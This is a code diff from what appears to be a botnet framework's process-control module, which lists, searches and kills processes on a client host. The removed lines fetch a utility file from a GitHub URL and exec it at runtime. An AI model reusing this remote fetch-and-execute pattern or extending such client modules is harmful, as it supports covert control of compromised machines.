@@ -14,24 +14,18 @@ import threading
 import collections
 
 # utilities
-util = imp.new_module('util')
-exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py').read(), 'https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py', 'exec') in util.__dict__
-sys.modules['util'] = util
+import core.util as util
 
 # globals
 packages  = []
 platforms = ['win32','linux2','darwin']
 usage = 'process <list/search/kill>'
 description = """ 
-List or search currently running processes on the client host machine
+List/search/kill currently running processes on the client host machine
 """
 _buffer = StringIO.StringIO()
 _workers = {}
 _abort  = False
-
-# setup
-if util.is_compatible(platforms, __name__):
-    util.imports(packages, globals())
 
 # main
 def list(*args, **kwargs):
